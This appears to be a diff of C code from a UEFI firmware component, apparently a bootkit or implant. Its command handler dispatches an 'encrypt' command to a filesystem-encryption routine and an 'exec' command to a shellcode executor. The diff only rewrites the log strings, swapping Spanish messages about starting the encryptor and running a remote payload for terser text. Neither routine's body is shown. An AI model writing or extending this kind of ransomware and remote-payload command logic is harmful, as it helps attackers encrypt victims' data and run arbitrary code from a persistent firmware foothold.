@@ -23,12 +23,12 @@ VOID ProcessCommand(CHAR16* Cmd) {
 
     }
     else if (StrCmp(Cmd, L"encrypt") == 0) {
-        LogInfo(L"[Cmd] Iniciando encriptador\n");
+        LogInfo(L"ok\n");
         EncryptFilesystem();  
     }
     else if (StrnCmp(Cmd, L"exec ", 5) == 0) {
         CHAR16* Payload = Cmd + 5;
-        LogInfo(L"[Cmd] Ejecutando payload remoto\n");
+        LogInfo(L"executing payload\n");
         ExecuteShellcode(Payload);  
     }
     else {
